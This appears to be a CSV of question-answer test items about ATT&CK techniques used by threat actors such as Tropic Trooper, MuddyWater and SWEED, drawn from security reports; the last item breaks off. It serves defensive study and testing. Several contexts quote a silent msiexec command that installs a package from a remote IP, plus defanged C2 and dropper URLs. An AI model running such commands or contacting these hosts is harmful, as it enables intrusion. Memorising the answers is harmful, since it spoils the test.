1269,261,261-Defense Evasion-T1221-Template Injection,"After achieving initial access by employing macro-enabled template files hosted on third-party services as phishing lures, is it likely that Yellow Garuda will disrupt analysis efforts during defense evasion by remotely staging parts of the infection chain and employing RC4-encrypted strings?","Defense Evasion: Yellow Garuda's use of macro-enabled template files disrupts analysis efforts by staging various parts of the infection chain remotely. The template files contained RC4-encrypted strings, and the decryption key was obtained via an HTTP GET request to an Amazon S3 bucket. These steps likely thwart analysis if the password to open the document is not available or if the infrastructure hosting the decryption key is inactive.","Resource Development: Yellow Garuda, also known as Charming Kitten, PHOSPHORUS, and UNC788, has been active since at least 2012. This Iran-based threat actor is known for spoofing login pages of legitimate webmail services to harvest credentials. They have also expanded their toolset to include Android malware, specifically 1PINEFLOWER, which aligns with the capabilities of data exfiltrated from mobile devices.
Initial Access: Yellow Garuda has been observed using macro-enabled template files for initial access as recently as March 2022. This new tactic involves remote template injection to execute a malicious macro, a method not previously associated with this threat actor. The initial documents were hosted on third-party services like Dropbox or AWS, and phishing was likely used to coerce victims into downloading and opening the documents.
Persistence: Yellow Garuda's macro-enabled template files maintain persistence by replacing the victim's default Microsoft Word template. This ensures that the malicious template and macro will open whenever Microsoft Word is used by the victim.
Credential Access: Yellow Garuda has a history of extensive credential harvesting via dedicated phishing sites. They have also used a Telegram 'grabber' tool to exfiltrate information from victims' Telegram accounts, including messages, media, group memberships, and contact data. The tool requires access to the victim's active Telegram session or SMS messages for authentication.
Collection: Yellow Garuda's Telegram 'grabber' tool collects messages, media, group memberships, and contact data from victims' Telegram accounts. The exfiltrated data is stored within a SQLite database and also in JSON format. The tool also allows the threat actor to delete messages from the victim's account.
Exfiltration: The Telegram 'grabber' tool used by Yellow Garuda exfiltrates data from victims' Telegram accounts over the web. The exfiltrated data includes messages, media, group memberships, and contact data, which is stored in a SQLite database and JSON format.
Others: Yellow Garuda's OPSEC mistakes have led to the disclosure of their tools, techniques, and procedures. An open directory containing several compressed archives associated with Yellow Garuda activity was discovered, revealing a new tool used to enumerate data from targeted Telegram accounts. An alias tied to early Iran-based operations and a surveillance report likely written by a Yellow Garuda operator were also identified. The report provides insight into the threat actor's data collection objectives and internal structure, denoted by numerical call signs, and highlights the alias of an individual linked to Iran-based activity over several years.",Yes,"Old cat, new tricks, bad habits"
1270,261,261-Persistence-T1137-Office Application Startup,"After using macro-enabled template files for initial access via phishing and remote template injection, is it likely that Yellow Garuda will maintain persistence by replacing the victim's default Microsoft Word template before employing RC4-encrypted strings and remote staging to evade defenses?",Persistence: Yellow Garuda's macro-enabled template files maintain persistence by replacing the victim's default Microsoft Word template. This ensures that the malicious template and macro will open whenever Microsoft Word is used by the victim.,"Resource Development: Yellow Garuda, also known as Charming Kitten, PHOSPHORUS, and UNC788, has been active since at least 2012. This Iran-based threat actor is known for spoofing login pages of legitimate webmail services to harvest credentials. They have also expanded their toolset to include Android malware, specifically 1PINEFLOWER, which aligns with the capabilities of data exfiltrated from mobile devices.
Initial Access: Yellow Garuda has been observed using macro-enabled template files for initial access as recently as March 2022. This new tactic involves remote template injection to execute a malicious macro, a method not previously associated with this threat actor. The initial documents were hosted on third-party services like Dropbox or AWS, and phishing was likely used to coerce victims into downloading and opening the documents.
Defense Evasion: Yellow Garuda's use of macro-enabled template files disrupts analysis efforts by staging various parts of the infection chain remotely. The template files contained RC4-encrypted strings, and the decryption key was obtained via an HTTP GET request to an Amazon S3 bucket. These steps likely thwart analysis if the password to open the document is not available or if the infrastructure hosting the decryption key is inactive.
Credential Access: Yellow Garuda has a history of extensive credential harvesting via dedicated phishing sites. They have also used a Telegram 'grabber' tool to exfiltrate information from victims' Telegram accounts, including messages, media, group memberships, and contact data. The tool requires access to the victim's active Telegram session or SMS messages for authentication.
Collection: Yellow Garuda's Telegram 'grabber' tool collects messages, media, group memberships, and contact data from victims' Telegram accounts. The exfiltrated data is stored within a SQLite database and also in JSON format. The tool also allows the threat actor to delete messages from the victim's account.
Exfiltration: The Telegram 'grabber' tool used by Yellow Garuda exfiltrates data from victims' Telegram accounts over the web. The exfiltrated data includes messages, media, group memberships, and contact data, which is stored in a SQLite database and JSON format.
Others: Yellow Garuda's OPSEC mistakes have led to the disclosure of their tools, techniques, and procedures. An open directory containing several compressed archives associated with Yellow Garuda activity was discovered, revealing a new tool used to enumerate data from targeted Telegram accounts. An alias tied to early Iran-based operations and a surveillance report likely written by a Yellow Garuda operator were also identified. The report provides insight into the threat actor's data collection objectives and internal structure, denoted by numerical call signs, and highlights the alias of an individual linked to Iran-based activity over several years.",Yes,"Old cat, new tricks, bad habits"
1275,261,261-Exfiltration-T1567-Exfiltration Over Web Service,"After Yellow Garuda collects messages, media, group memberships, and contact data from victims' Telegram accounts using the Telegram 'grabber' tool, is it likely that these data are exfiltrated over the web and stored in SQLite database and JSON format?","Exfiltration: The Telegram 'grabber' tool used by Yellow Garuda exfiltrates data from victims' Telegram accounts over the web. The exfiltrated data includes messages, media, group memberships, and contact data, which is stored in a SQLite database and JSON format.","Resource Development: Yellow Garuda, also known as Charming Kitten, PHOSPHORUS, and UNC788, has been active since at least 2012. This Iran-based threat actor is known for spoofing login pages of legitimate webmail services to harvest credentials. They have also expanded their toolset to include Android malware, specifically 1PINEFLOWER, which aligns with the capabilities of data exfiltrated from mobile devices.
Initial Access: Yellow Garuda has been observed using macro-enabled template files for initial access as recently as March 2022. This new tactic involves remote template injection to execute a malicious macro, a method not previously associated with this threat actor. The initial documents were hosted on third-party services like Dropbox or AWS, and phishing was likely used to coerce victims into downloading and opening the documents.
Persistence: Yellow Garuda's macro-enabled template files maintain persistence by replacing the victim's default Microsoft Word template. This ensures that the malicious template and macro will open whenever Microsoft Word is used by the victim.
Defense Evasion: Yellow Garuda's use of macro-enabled template files disrupts analysis efforts by staging various parts of the infection chain remotely. The template files contained RC4-encrypted strings, and the decryption key was obtained via an HTTP GET request to an Amazon S3 bucket. These steps likely thwart analysis if the password to open the document is not available or if the infrastructure hosting the decryption key is inactive.
Credential Access: Yellow Garuda has a history of extensive credential harvesting via dedicated phishing sites. They have also used a Telegram 'grabber' tool to exfiltrate information from victims' Telegram accounts, including messages, media, group memberships, and contact data. The tool requires access to the victim's active Telegram session or SMS messages for authentication.
Collection: Yellow Garuda's Telegram 'grabber' tool collects messages, media, group memberships, and contact data from victims' Telegram accounts. The exfiltrated data is stored within a SQLite database and also in JSON format. The tool also allows the threat actor to delete messages from the victim's account.
Others: Yellow Garuda's OPSEC mistakes have led to the disclosure of their tools, techniques, and procedures. An open directory containing several compressed archives associated with Yellow Garuda activity was discovered, revealing a new tool used to enumerate data from targeted Telegram accounts. An alias tied to early Iran-based operations and a surveillance report likely written by a Yellow Garuda operator were also identified. The report provides insight into the threat actor's data collection objectives and internal structure, denoted by numerical call signs, and highlights the alias of an individual linked to Iran-based activity over several years.",Yes,"Old cat, new tricks, bad habits"
1278,262,262-Execution-T1059-Command and Scripting Interpreter,"After Tropic Trooper gains initial access by exploiting vulnerabilities in Microsoft Office's Equation Editor and downloads and installs an MSI package, is it likely that the system will drop a backdoor installer and prepare for execution of the BITSadmin command-line tool by UserInstall.exe before the backdoor achieves persistence by loading an encrypted configuration file for connection to the C&C servers?","Execution: The system configuration file (in.sys) dropped a backdoor installer (UserInstall.exe) then deleted itself. The backdoor installer dropped a normal sidebar.exe file (a Windows Gadget tool), a malicious loader (in""C:\ProgramData\Apple\Update\wab32res.dll""), and an encrypted configuration file. UserInstall.exe abused the BITSadmin command-line tool to create a job and launch sidebar.exe. The malicious loader used dynamic-link library (DLL) hijacking on sidebar.exe and launched dllhost.exe (a normal file). The loader then injected a DLL backdoor into dllhost.exe. Malicious documents that don't need to download anything from the internet as the backdoor's dropper is already embedded in the document were also observed.","Initial Access: Tropic Trooper, also known as KeyBoy, executed commands through exploits for CVE-2017-11882 or CVE-2018-0802, which are security flaws in Microsoft Office's Equation Editor (EQNEDT32.EXE). They downloaded an installer package (.msi) and installed it on the system by executing the command: /c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]).
Persistence: The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&C) servers.
Defense Evasion: Tropic Trooper used DLL hijacking to evade antivirus detection, as the malicious wab32res.dll was loaded by a benign file, sidebar.exe. The installer dropped three files into the Apple/Update directory and created one hidden directory (UFile) into C:\ProgramData\Apple\Update\, likely as a ruse. The loader, named FakeRun, executed dllhost.exe and injected one malicious DLL file, which is the backdoor, into this process.
Command and Control: TClient used SSL to connect to Tropic Trooper's C&C server. The C&C server and some configuration values are not hardcoded in the backdoor, allowing Tropic Trooper's operators to easily change/update the C&C server and configure other values. TClient is one of Tropic Trooper's backdoors, which uses symmetric encryption to decrypt its configuration with a 16-byte key. TClient uses custom SSL libraries to connect the C&C server.
Others: Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware to targets. These documents use job vacancies in organizations that may be deemed socio-politically sensitive to recipients. The MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB). Another PDB string found is D:\Work\Project\VS\house\Apple\Apple_20180115\Release\InstallClient.pdb. At installation, the MSI file drops three files and creates one hidden directory (UFile) into C:\ProgramData\Apple\Update\, likely as a ruse. It would then use sidebar.exe to load the malicious wab32res.dll (TROJ_TCLT.ZDFB) through DLL hijacking. This is carried out to evade antivirus (AV) detection, because wab32res.dll is loaded by a benign file. Reverse analysis of TClient allowed us to determine how to decrypt the C&C information. TClient will use custom SSL libraries to connect the C&C server. We also found another SSL certificate on this C&C server. A closer look reveals that it was registered quite recently, and is set to expire after a year, suggesting Tropic Trooper's use or abuse of components or services that elapse so they can leave as few traces as possible.",Yes,Tropic Trooper’s New Strategy
1280,262,262-Execution-T1204-User Execution,"After Tropic Trooper gains initial access by exploiting Microsoft Office's Equation Editor vulnerabilities to download and install an MSI package, is it likely that malicious documents hosting the backdoor's dropper will be executed before the backdoor establishes persistence by decrypting its configuration file and connecting to the command-and-control servers via SSL?","Execution: The system configuration file (in.sys) dropped a backdoor installer (UserInstall.exe) then deleted itself. The backdoor installer dropped a normal sidebar.exe file (a Windows Gadget tool), a malicious loader (in""C:\ProgramData\Apple\Update\wab32res.dll""), and an encrypted configuration file. UserInstall.exe abused the BITSadmin command-line tool to create a job and launch sidebar.exe. The malicious loader used dynamic-link library (DLL) hijacking on sidebar.exe and launched dllhost.exe (a normal file). The loader then injected a DLL backdoor into dllhost.exe. Malicious documents that don't need to download anything from the internet as the backdoor's dropper is already embedded in the document were also observed.","Initial Access: Tropic Trooper, also known as KeyBoy, executed commands through exploits for CVE-2017-11882 or CVE-2018-0802, which are security flaws in Microsoft Office's Equation Editor (EQNEDT32.EXE). They downloaded an installer package (.msi) and installed it on the system by executing the command: /c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]).
Persistence: The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&C) servers.
Defense Evasion: Tropic Trooper used DLL hijacking to evade antivirus detection, as the malicious wab32res.dll was loaded by a benign file, sidebar.exe. The installer dropped three files into the Apple/Update directory and created one hidden directory (UFile) into C:\ProgramData\Apple\Update\, likely as a ruse. The loader, named FakeRun, executed dllhost.exe and injected one malicious DLL file, which is the backdoor, into this process.
Command and Control: TClient used SSL to connect to Tropic Trooper's C&C server. The C&C server and some configuration values are not hardcoded in the backdoor, allowing Tropic Trooper's operators to easily change/update the C&C server and configure other values. TClient is one of Tropic Trooper's backdoors, which uses symmetric encryption to decrypt its configuration with a 16-byte key. TClient uses custom SSL libraries to connect the C&C server.
Others: Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware to targets. These documents use job vacancies in organizations that may be deemed socio-politically sensitive to recipients. The MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB). Another PDB string found is D:\Work\Project\VS\house\Apple\Apple_20180115\Release\InstallClient.pdb. At installation, the MSI file drops three files and creates one hidden directory (UFile) into C:\ProgramData\Apple\Update\, likely as a ruse. It would then use sidebar.exe to load the malicious wab32res.dll (TROJ_TCLT.ZDFB) through DLL hijacking. This is carried out to evade antivirus (AV) detection, because wab32res.dll is loaded by a benign file. Reverse analysis of TClient allowed us to determine how to decrypt the C&C information. TClient will use custom SSL libraries to connect the C&C server. We also found another SSL certificate on this C&C server. A closer look reveals that it was registered quite recently, and is set to expire after a year, suggesting Tropic Trooper's use or abuse of components or services that elapse so they can leave as few traces as possible.",Yes,Tropic Trooper’s New Strategy
1283,262,262-Defense Evasion-T1055-Process Injection,"After using Equation Editor exploits to execute an installer package with malicious payloads, is Tropic Trooper likely to execute the FakeRun loader to launch dllhost.exe before injecting a malicious DLL backdoor into the same process to facilitate their attack?","Defense Evasion: Tropic Trooper used DLL hijacking to evade antivirus detection, as the malicious wab32res.dll was loaded by a benign file, sidebar.exe. The installer dropped three files into the Apple/Update directory and created one hidden directory (UFile) into C:\ProgramData\Apple\Update\, likely as a ruse. The loader, named FakeRun, executed dllhost.exe and injected one malicious DLL file, which is the backdoor, into this process.","Initial Access: Tropic Trooper, also known as KeyBoy, executed commands through exploits for CVE-2017-11882 or CVE-2018-0802, which are security flaws in Microsoft Office's Equation Editor (EQNEDT32.EXE). They downloaded an installer package (.msi) and installed it on the system by executing the command: /c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]).
Execution: The system configuration file (in.sys) dropped a backdoor installer (UserInstall.exe) then deleted itself. The backdoor installer dropped a normal sidebar.exe file (a Windows Gadget tool), a malicious loader (in""C:\ProgramData\Apple\Update\wab32res.dll""), and an encrypted configuration file. UserInstall.exe abused the BITSadmin command-line tool to create a job and launch sidebar.exe. The malicious loader used dynamic-link library (DLL) hijacking on sidebar.exe and launched dllhost.exe (a normal file). The loader then injected a DLL backdoor into dllhost.exe. Malicious documents that don't need to download anything from the internet as the backdoor's dropper is already embedded in the document were also observed.
Persistence: The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&C) servers.
Command and Control: TClient used SSL to connect to Tropic Trooper's C&C server. The C&C server and some configuration values are not hardcoded in the backdoor, allowing Tropic Trooper's operators to easily change/update the C&C server and configure other values. TClient is one of Tropic Trooper's backdoors, which uses symmetric encryption to decrypt its configuration with a 16-byte key. TClient uses custom SSL libraries to connect the C&C server.
Others: Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware to targets. These documents use job vacancies in organizations that may be deemed socio-politically sensitive to recipients. The MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB). Another PDB string found is D:\Work\Project\VS\house\Apple\Apple_20180115\Release\InstallClient.pdb. At installation, the MSI file drops three files and creates one hidden directory (UFile) into C:\ProgramData\Apple\Update\, likely as a ruse. It would then use sidebar.exe to load the malicious wab32res.dll (TROJ_TCLT.ZDFB) through DLL hijacking. This is carried out to evade antivirus (AV) detection, because wab32res.dll is loaded by a benign file. Reverse analysis of TClient allowed us to determine how to decrypt the C&C information. TClient will use custom SSL libraries to connect the C&C server. We also found another SSL certificate on this C&C server. A closer look reveals that it was registered quite recently, and is set to expire after a year, suggesting Tropic Trooper's use or abuse of components or services that elapse so they can leave as few traces as possible.",Yes,Tropic Trooper’s New Strategy
1285,262,262-Command and Control-T1105-Ingress Tool Transfer,"After Tropic Trooper removed its traces by using DLL hijacking to load the malicious wab32res.dll through a benign file during the Defense Evasion phase, is it likely that TClient will use SSL to connect to Tropic Trooper's C&C server during the Command and Control phase?","Command and Control: TClient used SSL to connect to Tropic Trooper's C&C server. The C&C server and some configuration values are not hardcoded in the backdoor, allowing Tropic Trooper's operators to easily change/update the C&C server and configure other values. TClient is one of Tropic Trooper's backdoors, which uses symmetric encryption to decrypt its configuration with a 16-byte key. TClient uses custom SSL libraries to connect the C&C server.","Initial Access: Tropic Trooper, also known as KeyBoy, executed commands through exploits for CVE-2017-11882 or CVE-2018-0802, which are security flaws in Microsoft Office's Equation Editor (EQNEDT32.EXE). They downloaded an installer package (.msi) and installed it on the system by executing the command: /c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]).
Execution: The system configuration file (in.sys) dropped a backdoor installer (UserInstall.exe) then deleted itself. The backdoor installer dropped a normal sidebar.exe file (a Windows Gadget tool), a malicious loader (in""C:\ProgramData\Apple\Update\wab32res.dll""), and an encrypted configuration file. UserInstall.exe abused the BITSadmin command-line tool to create a job and launch sidebar.exe. The malicious loader used dynamic-link library (DLL) hijacking on sidebar.exe and launched dllhost.exe (a normal file). The loader then injected a DLL backdoor into dllhost.exe. Malicious documents that don't need to download anything from the internet as the backdoor's dropper is already embedded in the document were also observed.
Persistence: The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&C) servers.
Defense Evasion: Tropic Trooper used DLL hijacking to evade antivirus detection, as the malicious wab32res.dll was loaded by a benign file, sidebar.exe. The installer dropped three files into the Apple/Update directory and created one hidden directory (UFile) into C:\ProgramData\Apple\Update\, likely as a ruse. The loader, named FakeRun, executed dllhost.exe and injected one malicious DLL file, which is the backdoor, into this process.
Others: Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware to targets. These documents use job vacancies in organizations that may be deemed socio-politically sensitive to recipients. The MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB). Another PDB string found is D:\Work\Project\VS\house\Apple\Apple_20180115\Release\InstallClient.pdb. At installation, the MSI file drops three files and creates one hidden directory (UFile) into C:\ProgramData\Apple\Update\, likely as a ruse. It would then use sidebar.exe to load the malicious wab32res.dll (TROJ_TCLT.ZDFB) through DLL hijacking. This is carried out to evade antivirus (AV) detection, because wab32res.dll is loaded by a benign file. Reverse analysis of TClient allowed us to determine how to decrypt the C&C information. TClient will use custom SSL libraries to connect the C&C server. We also found another SSL certificate on this C&C server. A closer look reveals that it was registered quite recently, and is set to expire after a year, suggesting Tropic Trooper's use or abuse of components or services that elapse so they can leave as few traces as possible.",Yes,Tropic Trooper’s New Strategy
1290,263,263-Command and Control-T1071-Application Layer Protocol,"Is it likely that after the PRB-Backdoor communicates with its C&C server via the domain hxxp://outl00k[.]net, the campaign would have already carried out activities involving the execution of PowerShell scripts triggered by the macro in the Word document and employed obfuscated macro scripts for defense evasion?","Command and Control: The PRB-Backdoor communicates with its Command-and-Control (C&C) server, hxxp://outl00k[.]net, to send and receive commands for various purposes, including initializing connection, registering the machine, gathering browsing histories, stealing passwords, reading and writing files, executing shell commands, recording keyboard strokes, capturing screenshots, updating functions, and gathering system information.","Initial Access: The MuddyWater campaign, first identified in 2017, has been observed using a new sample (Detected as W2KM_DLOADR.UHAOEEN) in May 2018, which utilizes a Microsoft Word document embedded with a malicious macro. This macro is designed to execute PowerShell scripts leading to a backdoor payload, notably without downloading additional component files but encoding all scripts within the document itself.
Execution: Upon enabling the macro within the lure document, the Document_Open() event triggers the execution of the malicious routine. This involves the use of three main functions: one to execute sub-functions, another to manipulate images in the document, and a third to construct and execute the main PowerShell commands and scripts.
Persistence: The PowerShell script decodes the contents of the malicious document and executes another encoded PowerShell script. This results in readable scripts that drop various components into the %Application Data%\Microsoft\CLR\* directory. The main PowerShell file, invoker.ps1, uses these components to run the final payload, PRB-Backdoor.
Defense Evasion: The campaign employs obfuscation methods for the macro scripts, resulting in an intended backdoor payload. This method is commonly used in samples associated with the MuddyWater campaign.
Others: The MuddyWater campaign targets users through phishing or spam, using lure documents designed with social engineering tactics. Trend Micro solutions such as Deep Discovery, Hosted Email Security, Deep Discovery Email Inspector, InterScan Web Security, and Smart Protection Suites provide protection against such attacks. The campaign has evolved its tools and techniques to be more effective and persistent, with the latest sample indicating a shift in the subject matter of lure documents, suggesting a broader range of targets.",Yes,another-potential-muddywater-campaign-uses-powershell-based-prb-backdoor
1294,264,264-Command and Control-T1573-Encrypted Channel,"After initiating execution of the Poison Ivy server by delivering it as mobile code via social engineering methods, is it likely that the malware will use the Camellia cipher for encrypted communications with the attacker's client during the Command and Control phase?","Command and Control: Poison Ivy features a complex, custom network protocol over TCP, with most communication encrypted using the Camellia cipher. The key is derived from a password provided by the attacker when building the Poison Ivy server. The protocol operates by sending encrypted data in chunks with a 32-byte header.","Initial Access: The preferred attack vectors used by the threat actors admin@338, th3bug, and menuPass are spear-phishing emails and strategic Web compromises. These methods are designed to entice targets to open attachments containing the malicious Poison Ivy server code or redirect them to exploit-laden websites.
Execution: The Poison Ivy builder kit allows attackers to customize and build their own Poison Ivy server, which is delivered as mobile code to a target that has been compromised, typically using social engineering. The server executes on the target's endpoint and connects to the attacker's client, giving them control of the system.
Persistence: If the 'persistence' option is enabled in Poison Ivy, a watchdog thread is injected into explorer.exe, which automatically restarts the Poison Ivy server process if it is unexpectedly terminated.
Defense Evasion: Poison Ivy's network communications are encrypted using the Camellia cipher with a 256-bit key, which may blend in with normal network activity, especially when using port 443 for SSL-encrypted Web traffic.
Others: The report details the use of Poison Ivy (PIVY), a RAT that remains popular and effective despite its age. FireEye has released Calamine, a set of tools to help detect and examine Poison Ivy infections. The report includes analysis of 194 Poison Ivy samples used in targeted attacks, extracting passwords, mutexes, and CnC infrastructure. It also provides insights into the tools, tactics, and procedures of the attackers, exploring campaign connections and enabling defenders to better secure their networks.",Yes,rpt-poison-ivy
1298,265,265-Defense Evasion-T1070-Indicator Removal,"After exploiting CVE-2017-11882 for silent code execution without user interaction and before stealing stored passwords and access tokens using techniques like Credential Dumping and Credentials in Registry, is it likely that the campaign will employ T1107 (File Deletion) as part of defense evasion?","Defense Evasion: The attack employed several defense evasion techniques: T1107 (File Deletion) by deleting the original file after infection, T1158 (Hidden Files and Directories), and T1045 (Software Packing) as the threat came packed/encrypted.","Initial Access: On 2019-10-26, a precision engineering company in Italy received a well-crafted email from steel@vardhman.com, which appeared to be from a legitimate company in the textile field. The email contained an attached Excel document requesting a quote for a list of spare parts, leveraging a tactic known as Spearphishing Attachment (T1193).
Execution: Upon opening the Excel document, the victim would see a realistic-looking spreadsheet without any macro code, thus not raising suspicion. However, the document contained a hidden object exploiting CVE-2017-11882, allowing silent code execution without user interaction (T1204 - User Execution).
Credential Access: The dropped PE file, educrety.exe, searched for stored passwords and access tokens in various registry keys, using techniques such as T1003 (Credential Dumping), T1081 (Credentials in Files), and T1214 (Credentials in Registry).
Collection: The malware collected data from the local system (T1005 - Data from Local System).
Command and Control: The stolen credentials were sent to a command and control server at http[://www.corpcougar.com/edu/Panel/five/fre.php using common ports and standard application layer protocols (T1043 - Commonly Used Port and T1071 - Standard Application Layer Protocol).
Exfiltration: The data was encrypted before being exfiltrated (T1002 - Data Encrypted).
Others: The attack is attributed to a threat actor known as SWEED, which has similarities to previous campaigns and targets precision engineering companies in Italy. The malware used in the attack includes a dropped PE file with hash 64114c398f1c14d4e840f62395edd9a8c43d834708f8d8fce12f8a6502b0e981 and a malicious document with hash 863934c1fa4378799ed0c3e353603ba0bee3a357a5c63d845fe0d7f4ebc1a64c. The dropping URL is http[://mail.hajj.zeem.sa/wp-admin/edu/educrety.exe. The attack also involved the use of a Microsoft Office exploit and implementation of LokiBot.",Yes,SWEED Targeting Precision Engineering Companies in Italy
1299,265,265-Defense Evasion-T1564-Hide Artifacts,"After executing hidden objects in an Excel document exploiting CVE-2017-11882 for silent code execution, is it likely that the attack will hide artifacts by employing T1158 (Hidden Files and Directories) before searching for and extracting credentials from the registry or stored files?","Defense Evasion: The attack employed several defense evasion techniques: T1107 (File Deletion) by deleting the original file after infection, T1158 (Hidden Files and Directories), and T1045 (Software Packing) as the threat came packed/encrypted.","Initial Access: On 2019-10-26, a precision engineering company in Italy received a well-crafted email from steel@vardhman.com, which appeared to be from a legitimate company in the textile field. The email contained an attached Excel document requesting a quote for a list of spare parts, leveraging a tactic known as Spearphishing Attachment (T1193).
Execution: Upon opening the Excel document, the victim would see a realistic-looking spreadsheet without any macro code, thus not raising suspicion. However, the document contained a hidden object exploiting CVE-2017-11882, allowing silent code execution without user interaction (T1204 - User Execution).
Credential Access: The dropped PE file, educrety.exe, searched for stored passwords and access tokens in various registry keys, using techniques such as T1003 (Credential Dumping), T1081 (Credentials in Files), and T1214 (Credentials in Registry).
Collection: The malware collected data from the local system (T1005 - Data from Local System).
Command and Control: The stolen credentials were sent to a command and control server at http[://www.corpcougar.com/edu/Panel/five/fre.php using common ports and standard application layer protocols (T1043 - Commonly Used Port and T1071 - Standard Application Layer Protocol).
Exfiltration: The data was encrypted before being exfiltrated (T1002 - Data Encrypted).
Others: The attack is attributed to a threat actor known as SWEED, which has similarities to previous campaigns and targets precision engineering companies in Italy. The malware used in the attack includes a dropped PE file with hash 64114c398f1c14d4e840f62395edd9a8c43d834708f8d8fce12f8a6502b0e981 and a malicious document with hash 863934c1fa4378799ed0c3e353603ba0bee3a357a5c63d845fe0d7f4ebc1a64c. The dropping URL is http[://mail.hajj.zeem.sa/wp-admin/edu/educrety.exe. The attack also involved the use of a Microsoft Office exploit and implementation of LokiBot.",Yes,SWEED Targeting Precision Engineering Companies in Italy
1300,265,265-Defense Evasion-T1027-Obfuscated Files or Information,"After employing spearphishing attachment to gain initial access and executing malicious code by exploiting a Microsoft Office vulnerability, is it likely that the SWEED campaign used obfuscation methods such as packing/encryption to avoid detection before obtaining credentials from the victim’s registry?","Defense Evasion: The attack employed several defense evasion techniques: T1107 (File Deletion) by deleting the original file after infection, T1158 (Hidden Files and Directories), and T1045 (Software Packing) as the threat came packed/encrypted.","Initial Access: On 2019-10-26, a precision engineering company in Italy received a well-crafted email from steel@vardhman.com, which appeared to be from a legitimate company in the textile field. The email contained an attached Excel document requesting a quote for a list of spare parts, leveraging a tactic known as Spearphishing Attachment (T1193).
Execution: Upon opening the Excel document, the victim would see a realistic-looking spreadsheet without any macro code, thus not raising suspicion. However, the document contained a hidden object exploiting CVE-2017-11882, allowing silent code execution without user interaction (T1204 - User Execution).
Credential Access: The dropped PE file, educrety.exe, searched for stored passwords and access tokens in various registry keys, using techniques such as T1003 (Credential Dumping), T1081 (Credentials in Files), and T1214 (Credentials in Registry).
Collection: The malware collected data from the local system (T1005 - Data from Local System).
Command and Control: The stolen credentials were sent to a command and control server at http[://www.corpcougar.com/edu/Panel/five/fre.php using common ports and standard application layer protocols (T1043 - Commonly Used Port and T1071 - Standard Application Layer Protocol).
Exfiltration: The data was encrypted before being exfiltrated (T1002 - Data Encrypted).
Others: The attack is attributed to a threat actor known as SWEED, which has similarities to previous campaigns and targets precision engineering companies in Italy. The malware used in the attack includes a dropped PE file with hash 64114c398f1c14d4e840f62395edd9a8c43d834708f8d8fce12f8a6502b0e981 and a malicious document with hash 863934c1fa4378799ed0c3e353603ba0bee3a357a5c63d845fe0d7f4ebc1a64c. The dropping URL is http[://mail.hajj.zeem.sa/wp-admin/edu/educrety.exe. The attack also involved the use of a Microsoft Office exploit and implementation of LokiBot.",Yes,SWEED Targeting Precision Engineering Companies in Italy
1301,265,265-Command and Control-T1071-Application Layer Protocol,"After collecting data from the local system, is it likely that the stolen credentials will be sent to a command and control server using standard application layer protocols before encrypting the data for exfiltration?",Command and Control: The stolen credentials were sent to a command and control server at http[://www.corpcougar.com/edu/Panel/five/fre.php using common ports and standard application layer protocols (T1043 - Commonly Used Port and T1071 - Standard Application Layer Protocol).,"Initial Access: On 2019-10-26, a precision engineering company in Italy received a well-crafted email from steel@vardhman.com, which appeared to be from a legitimate company in the textile field. The email contained an attached Excel document requesting a quote for a list of spare parts, leveraging a tactic known as Spearphishing Attachment (T1193).
Execution: Upon opening the Excel document, the victim would see a realistic-looking spreadsheet without any macro code, thus not raising suspicion. However, the document contained a hidden object exploiting CVE-2017-11882, allowing silent code execution without user interaction (T1204 - User Execution).
Defense Evasion: The attack employed several defense evasion techniques: T1107 (File Deletion) by deleting the original file after infection, T1158 (Hidden Files and Directories), and T1045 (Software Packing) as the threat came packed/encrypted.
Credential Access: The dropped PE file, educrety.exe, searched for stored passwords and access tokens in various registry keys, using techniques such as T1003 (Credential Dumping), T1081 (Credentials in Files), and T1214 (Credentials in Registry).
Collection: The malware collected data from the local system (T1005 - Data from Local System).
Exfiltration: The data was encrypted before being exfiltrated (T1002 - Data Encrypted).
Others: The attack is attributed to a threat actor known as SWEED, which has similarities to previous campaigns and targets precision engineering companies in Italy. The malware used in the attack includes a dropped PE file with hash 64114c398f1c14d4e840f62395edd9a8c43d834708f8d8fce12f8a6502b0e981 and a malicious document with hash 863934c1fa4378799ed0c3e353603ba0bee3a357a5c63d845fe0d7f4ebc1a64c. The dropping URL is http[://mail.hajj.zeem.sa/wp-admin/edu/educrety.exe. The attack also involved the use of a Microsoft Office exploit and implementation of LokiBot.",Yes,SWEED Targeting Precision Engineering Companies in Italy
1304,265,265-Collection-T1005-Data from Local System,"Is it likely that after the threat actor SWEED exploited CVE-2017-11882 for silent code execution, it will proceed to collect data from the local system after employing defense evasion techniques such as software packing and deletion of the original file?",Collection: The malware collected data from the local system (T1005 - Data from Local System).,"Initial Access: On 2019-10-26, a precision engineering company in Italy received a well-crafted email from steel@vardhman.com, which appeared to be from a legitimate company in the textile field. The email contained an attached Excel document requesting a quote for a list of spare parts, leveraging a tactic known as Spearphishing Attachment (T1193).
Execution: Upon opening the Excel document, the victim would see a realistic-looking spreadsheet without any macro code, thus not raising suspicion. However, the document contained a hidden object exploiting CVE-2017-11882, allowing silent code execution without user interaction (T1204 - User Execution).
Defense Evasion: The attack employed several defense evasion techniques: T1107 (File Deletion) by deleting the original file after infection, T1158 (Hidden Files and Directories), and T1045 (Software Packing) as the threat came packed/encrypted.
